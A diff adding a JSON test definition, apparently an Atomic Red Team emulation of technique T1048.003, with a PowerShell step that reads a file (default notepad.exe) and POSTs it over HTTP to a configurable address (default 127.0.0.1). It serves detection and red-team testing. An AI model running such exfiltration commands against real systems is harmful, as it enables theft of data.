@@ -1,0 +1,37 @@
+{
+  "id": "6aa58451-1121-4490-a8e9-1dada3f1c68c",
+  "name": "Exfiltration Over Alternative Protocol - HTTP",
+  "description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "b024b6ea-34ac-460e-adec-afcf20e330c5",
+      "type": "execute-command",
+      "data": {
+        "command": "$content = Get-Content #{input_file}\nInvoke-WebRequest -Uri #{ip_address} -Method POST -Body $content\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1048.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "input_file",
+      "type": "path",
+      "description": "Path to file to exfiltrate",
+      "value": "C:\\Windows\\System32\\notepad.exe"
+    },
+    {
+      "name": "ip_address",
+      "type": "string",
+      "description": "Destination IP address where the data should be sent",
+      "value": "http://127.0.0.1"
+    }
+  ]
+}
